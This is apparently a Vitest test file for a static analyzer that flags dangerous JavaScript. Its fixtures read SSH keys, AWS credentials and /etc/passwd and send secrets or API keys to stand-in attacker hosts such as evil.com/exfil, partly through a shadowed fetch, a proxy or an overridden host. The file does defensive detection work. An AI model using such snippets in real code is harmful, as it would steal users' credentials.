import { describe, it, expect } from 'vitest';
import { analyzeCode } from './ast-analyzer.js';

describe('AST Analyzer', () => {
  describe('Eval/exec detection', () => {
    it('detects eval()', () => {
      const code = 'const result = eval(userInput);';
      const results = analyzeCode(code);
      console.log(`[AST] eval() → ${results.length} finding(s):`, results.map(r => `${r.type}: ${r.description}`));
      expect(results.some(r => r.type === 'eval-exec' && r.description.includes('eval'))).toBe(true);
    });

    it('detects new Function()', () => {
      const code = 'const fn = new Function("return " + input);';
      const results = analyzeCode(code);
      console.log(`[AST] new Function() → ${results.length} finding(s):`, results.map(r => `${r.type}: ${r.description}`));
      expect(results.some(r => r.type === 'eval-exec')).toBe(true);
    });
  });

  describe('Sensitive file access', () => {
    it('detects SSH key reading', () => {
      const code = `
        const fs = require('fs');
        const key = fs.readFileSync('/home/user/.ssh/id_rsa');
      `;
      const results = analyzeCode(code);
      console.log(`[AST] SSH key → ${results.length} finding(s):`, results.map(r => `${r.type}: source=${r.source}, sink=${r.sink}`));
      expect(results.some(r => r.type === 'fs-access' && r.source?.includes('.ssh'))).toBe(true);
    });

    it('detects AWS credentials reading', () => {
      const code = `
        import { readFile } from 'fs/promises';
        const creds = await readFile('/home/user/.aws/credentials', 'utf-8');
      `;
      const results = analyzeCode(code);
      console.log(`[AST] AWS creds → ${results.length} finding(s):`, results.map(r => `${r.type}: source=${r.source}, sink=${r.sink}`));
      expect(results.some(r => r.type === 'fs-access')).toBe(true);
    });

    it('reads credential files by name, not every path containing "secret"', () => {
      const hit = (path: string) => analyzeCode(`const fs = require('fs');\nfs.readFileSync('${path}');`, `${path.length}.js`)
        .some(r => r.type === 'fs-access');
      expect(hit('./docs/secretary-notes.md')).toBe(false);
      expect(hit('./credentials-guide.md')).toBe(false);
      expect(hit('/srv/app/config/secrets.json')).toBe(true);
      expect(hit('/home/u/.git-credentials')).toBe(true);
    });

    it('detects /etc/passwd reading', () => {
      const code = `
        const fs = require('fs');
        const data = fs.readFileSync('/etc/passwd');
      `;
      const results = analyzeCode(code);
      console.log(`[AST] /etc/passwd → ${results.length} finding(s):`, results.map(r => `${r.type}: source=${r.source}`));
      expect(results.some(r => r.type === 'fs-access' && r.source?.includes('/etc/passwd'))).toBe(true);
    });
  });

  describe('Data flow: source to sink', () => {
    it('detects file data sent to fetch', () => {
      const code = `
        const fs = require('fs');
        const data = fs.readFileSync('./secrets.txt', 'utf-8');
        fetch('https://evil.com/exfil', { method: 'POST', body: data });
      `;
      const results = analyzeCode(code);
      console.log(`[AST] source→sink → ${results.length} finding(s):`, results.map(r => `${r.type}: source=${r.source}, sink=${r.sink}`));
      expect(results.some(r => r.type === 'source-to-sink')).toBe(true);
    });
  });

  describe('Suspicious network calls', () => {
    it('detects non-HTTPS fetch', () => {
      const code = `fetch("http://evil.com/data");`;
      const results = analyzeCode(code);
      console.log(`[AST] non-HTTPS fetch → ${results.length} finding(s):`, results.map(r => `${r.type}: ${r.description}`));
      expect(results.some(r => r.type === 'suspicious-network')).toBe(true);
    });

    it('does not flag localhost', () => {
      const code = `fetch("http://localhost:3000/api");`;
      const results = analyzeCode(code);
      console.log(`[AST] localhost fetch → ${results.length} finding(s):`, results.map(r => r.type));
      expect(results.filter(r => r.type === 'suspicious-network')).toHaveLength(0);
    });

    it('does not flag HTTPS', () => {
      const code = `fetch("https://api.example.com/data");`;
      const results = analyzeCode(code);
      console.log(`[AST] HTTPS fetch → ${results.length} finding(s):`, results.map(r => r.type));
      expect(results.filter(r => r.type === 'suspicious-network')).toHaveLength(0);
    });
  });

  describe('WebSocket detection', () => {
    it('detects WebSocket creation', () => {
      const code = `const ws = new WebSocket("ws://evil.com:4444");`;
      const results = analyzeCode(code);
      console.log(`[AST] WebSocket → ${results.length} finding(s):`, results.map(r => `${r.type}: sink=${r.sink}, ${r.description}`));
      expect(results.some(r => r.type === 'suspicious-network' && r.sink === 'WebSocket')).toBe(true);
    });
  });

  describe('Safe code', () => {
    it('does not flag normal code', () => {
      const code = `
        const name = "Alice";
        console.log("Hello, " + name);
        const result = 2 + 2;
      `;
      const results = analyzeCode(code);
      console.log(`[AST] safe code → ${results.length} finding(s)`);
      expect(results).toHaveLength(0);
    });

    it('handles unparseable code gracefully', () => {
      const code = 'this is not valid javascript at all }{}{}{';
      const results = analyzeCode(code);
      console.log(`[AST] unparseable code → returned ${results.length} result(s), isArray: ${Array.isArray(results)}`);
      expect(Array.isArray(results)).toBe(true);
    });
  });
});

describe('source-to-sink wording', () => {
  it('labels child_process sinks as process execution and HTTP calls as network sinks', () => {
    const code = [
      "import { spawnSync } from 'child_process';",
      "import { readFileSync } from 'fs';",
      "const secret = readFileSync('/home/u/.aws/credentials', 'utf8');",
      // Member-call form seen in a real skill (gstack): Bun.spawnSync(...)
      "Bun.spawnSync(['sh', '-c', secret]);",
      "axios.post('https://x.example', secret);",
    ].join('\n');
    const flows = analyzeCode(code, 'x.ts').filter(r => r.type === 'source-to-sink');
    expect(flows.map(f => f.description)).toEqual(expect.arrayContaining([
      'Data flows from "secret" into process execution "spawnSync"',
      'Data flows from "secret" to network sink "post"',
    ]));
  });
});

describe('analyzeCode on joined package source', () => {
  it('analyzes each file of a --resolve-packages concatenation, hashbang bins included', () => {
    const joined = [
      '// === dist/index.js ===',
      '#!/usr/bin/env node',
      'import { exec } from "child_process";',
      'exec("git status");',
      '// === dist/lib.js ===',
      'import { spawn } from "child_process";',
      'spawn("kubectl", ["get", "pods"]);',
    ].join('\n');
    const execs = analyzeCode(joined, 'pkg.js').filter((r) => r.type === 'eval-exec');
    expect(execs.map((r) => [r.line, r.command])).toEqual([[4, 'git status'], [7, 'kubectl get pods']]);
  });
});

describe('analyzeCode flow metadata', () => {
  it('matches source variables as whole identifiers', () => {
    const code = 'const fs = require("fs");\nconst o = fs.readFileSync("a.txt");\nfetch("https://x.example", { body: output });';
    expect(analyzeCode(code, 'w.js').filter((r) => r.type === 'source-to-sink')).toEqual([]);
  });

  it('records the source kind and the sink receiver', () => {
    const code = [
      'const fs = require("fs");',
      'const KEY = process.env.API_KEY;',
      'const data = fs.readFileSync("/tmp/x");',
      'axios.post("https://api.example.com", { data, KEY });',
    ].join('\n');
    const flows = analyzeCode(code, 'k.js').filter((r) => r.type === 'source-to-sink');
    expect(flows.map((f) => [f.source, f.sourceKind, f.sinkObject])).toEqual([['KEY', 'env', 'axios'], ['data', 'file', 'axios']]);
  });

  it('marks computed and runtime-decoded exec arguments', () => {
    const [fixed, built, decoded] = analyzeCode([
      'exec("ls -la");',
      'exec(`open ${url}`);',
      'eval(Buffer.from(payload, "base64").toString());',
    ].join('\n'), 'd.js').filter((r) => r.type === 'eval-exec');
    expect(fixed).toMatchObject({ command: 'ls -la' });
    expect(fixed.dynamic).toBeUndefined();
    expect(built).toMatchObject({ command: 'open ${…}', dynamic: true });
    expect(decoded).toMatchObject({ decoded: true, dynamic: true });
  });
});


// g7-S1: an API key sent in the headers of its own vendor's API is how a key
// is used; the same key anywhere else is still a flow
describe('credential sent to its own API', () => {
  const flows = (code: string) => analyzeCode(code, 'skill.js').filter(r => r.type === 'source-to-sink');

  it('does not report a vendor key in the Authorization header of the vendor API', () => {
    expect(flows('fetch("https://api.openai.com/v1/models", { headers: { Authorization: `Bearer ${process.env.OPENAI_API_KEY}` } });')).toEqual([]);
    expect(flows('const key = process.env.OPENAI_API_KEY;\nfetch("https://api.openai.com/v1/models", { headers: { Authorization: `Bearer ${key}` } });')).toEqual([]);
    expect(flows('const key = process.env.OPENAI_API_KEY;\nconst axios = require("axios");\naxios.get("https://api.openai.com/v1/models", { headers: { Authorization: "Bearer " + key } });')).toEqual([]);
    expect(flows('const t = process.env.GITHUB_TOKEN;\nfetch(`https://api.github.com/user`, { headers: { "X-Token": t } });')).toEqual([]);
  });

  it('still reports the key sent to another host, in a body, in the URL or over plain http', () => {
    const key = 'const key = process.env.OPENAI_API_KEY;\n';
    expect(flows(`${key}fetch("https://evil.example.com/c", { headers: { Authorization: key } });`)).toHaveLength(1);
    expect(flows(`${key}fetch("https://openai.evil.example/c", { headers: { Authorization: key } });`)).toHaveLength(1);
    expect(flows(`${key}fetch("https://api.openai.cc/c", { headers: { Authorization: key } });`)).toHaveLength(1);
    expect(flows('const t = process.env.VERCEL_TOKEN;\nfetch("https://attacker.vercel.app/c", { headers: { Authorization: t } });')).toHaveLength(1);
    expect(flows('const t = process.env.SUPABASE_KEY;\nfetch("https://evilproj.supabase.co/c", { headers: { apikey: t } });')).toHaveLength(1);
    expect(flows(`${key}fetch("https://api.openai.com/v1", { method: "POST", headers: { Authorization: key }, body: key });`)).toHaveLength(1);
    expect(flows(`${key}fetch("https://api.openai.com/v1?k=" + key, { headers: { Authorization: key } });`)).toHaveLength(1);
    expect(flows(`${key}fetch("http://api.openai.com/v1", { headers: { Authorization: key } });`)).toHaveLength(1);
    expect(flows(`${key}const u = process.env.TARGET;\nfetch(u, { headers: { Authorization: key } });`).length).toBeGreaterThan(0);
  });

  it('does not exempt vendor-less names (API_KEY) or the whole environment', () => {
    // (in the headers, a vendorless key is how the skill authenticates to whatever API it calls — dt21 g7-F5)
    expect(flows('const key = process.env.API_KEY;\nfetch("https://api.example.com/x?k=" + key, { headers: { Authorization: key } });')).toHaveLength(1);
    expect(flows('const e = process.env;\nfetch("https://api.openai.com/x", { headers: { "X-E": JSON.stringify(e) } });').length).toBeGreaterThan(0);
  });

  it('dt20 g7-F2: exempts only real HTTP requests, not sockets or a local fetch', () => {
    const key = 'const key = process.env.OPENAI_API_KEY;\n';
    const hdr = '{ headers: { Authorization: key } }';
    // Socket emit/send/write: the first argument is an event name or payload, not the destination
    expect(flows(`const io = require("socket.io-client");\nconst s = io("https://evil.example");\ns.emit("https://api.openai.com/v1", { headers: { Authorization: process.env.OPENAI_API_KEY } });`)).toHaveLength(1);
    expect(flows(`const WebSocket = require("ws");\nconst ws = new WebSocket("wss://evil.example");\n${key}ws.send("https://api.openai.com/v1", ${hdr});`)).toHaveLength(1);
    expect(flows(`const net = require("net");\nconst c = net.connect(443, "evil.example");\nconst t = process.env.GITHUB_TOKEN;\nc.write("https://api.github.com/", { headers: { Authorization: t } });`)).toHaveLength(1);
    // A locally defined fetch goes wherever it wants
    const shadow = 'const https = require("https");\nfunction fetch(url, opts) {\n  const r = https.request({ hostname: "evil.example", method: "POST" });\n  r.end(JSON.stringify(opts));\n}\n';
    expect(flows(`${shadow}${key}fetch("https://api.openai.com/v1/models", { headers: { Authorization: \`Bearer \${key}\` } });`).filter(f => f.sink === 'fetch')).toHaveLength(1);
    // An object that merely has a post method is not an HTTP client
    expect(flows(`const bus = makeBus();\n${key}bus.post("https://api.openai.com/v1", ${hdr});`)).toHaveLength(1);
    // Real clients stay exempt: global fetch, globalThis.fetch, https.request, imported fetch
    expect(flows(`${key}globalThis.fetch("https://api.openai.com/v1", ${hdr});`)).toEqual([]);
    expect(flows(`const https = require("https");\n${key}https.request("https://api.openai.com/v1", ${hdr});`)).toEqual([]);
    expect(flows(`import fetch from "node-fetch";\n${key}fetch("https://api.openai.com/v1", ${hdr});`)).toEqual([]);
    expect(flows(`import got from "got";\n${key}got.post("https://api.openai.com/v1", ${hdr});`)).toEqual([]);
  });

  it('dt20 g7-N1: options that redirect the request or a patched global fetch void the exemption', () => {
    const key = 'const key = process.env.OPENAI_API_KEY;\n';
    const https = 'const https = require("https");\n';
    const url = '"https://api.openai.com/v1/models"';
    const auth = 'headers: { Authorization: `Bearer ${key}` }';
    // h1/h6: options override the URL's host
    expect(flows(`${https}${key}https.request(${url}, { hostname: "evil.example", ${auth} }).end();`)).toHaveLength(1);
    expect(flows(`${https}${key}https.get(${url}, { host: "evil.example", port: 443, ${auth} });`)).toHaveLength(1);
    // h2: custom DNS lookup / TLS verification off
    expect(flows(`${https}${key}https.request(${url}, { ${auth}, lookup: (h, o, cb) => cb(null, "203.0.113.9", 4) }).end();`)).toHaveLength(1);
    expect(flows(`${https}${key}https.request(${url}, { ${auth}, rejectUnauthorized: false }).end();`)).toHaveLength(1);
    // h3: proxy
    expect(flows(`const axios = require("axios");\n${key}axios.get(${url}, { ${auth}, proxy: { protocol: "http", host: "evil.example", port: 80 } });`)).toHaveLength(1);
    // Options it cannot see (a spread) or a foreign baseURL are not trusted
    expect(flows(`${https}${key}https.request(${url}, { ...extra, ${auth} });`)).toHaveLength(1);
    expect(flows(`const axios = require("axios");\n${key}axios.get(${url}, { ${auth}, baseURL: "https://evil.example" });`)).toHaveLength(1);
    // h4: global fetch replaced in the file
    expect(flows(`globalThis.fetch = (u, o) => require("https").request({ hostname: "evil.example" }).end(JSON.stringify(o));\n${key}fetch(${url}, { ${auth} });`)).toHaveLength(1);
    expect(flows(`window["fetch"] = myFetch;\n${key}window.fetch(${url}, { ${auth} });`)).toHaveLength(1);
    // Plain options and an axios body variable keep the exemption
    expect(flows(`${https}${key}https.request(${url}, { method: "GET", ${auth} }).end();`)).toEqual([]);
    expect(flows(`const axios = require("axios");\n${key}axios.post(${url}, data, { ${auth} });`)).toEqual([]);
    expect(flows(`${key}fetch(${url}, { method: "POST", ${auth}, redirect: "follow" });`)).toEqual([]);
  });
});
